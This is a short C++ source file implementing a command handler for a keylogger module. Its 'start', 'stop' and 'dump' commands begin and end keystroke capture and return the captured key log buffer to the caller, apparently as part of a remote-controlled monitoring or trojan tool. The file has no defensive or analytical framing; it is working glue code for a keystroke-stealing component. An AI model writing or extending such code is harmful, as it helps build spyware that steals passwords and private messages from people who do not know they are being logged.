#include <sstream>
#include <iostream>

#include "KeyCommand.h"
#include "KeyController.h"

std::string KeyCommand::execute(const std::string& args) {
    std::cout << args << "\n";
    if (args == "start") {
        KeyControllerModule::start();
        return "SUCCESS: Key capture started."; // Sửa lại thông báo để nhất quán
    }

    if (args == "stop") {
        KeyControllerModule::stop();
        return "SUCCESS: Key capture stopped.";
    }

    if (args == "dump") {
        std::string keylog_data = KeyControllerModule::getBuffer();

        /*if (!keylog_data.empty()) {
            return "SUCCESS: Key log content:\n" + keylog_data;
        }
        else {
            return "SUCCESS: Key log buffer is currently empty.";
        }*/
        return keylog_data;
    }

    return "ERROR: Unknown key command: " + args;
}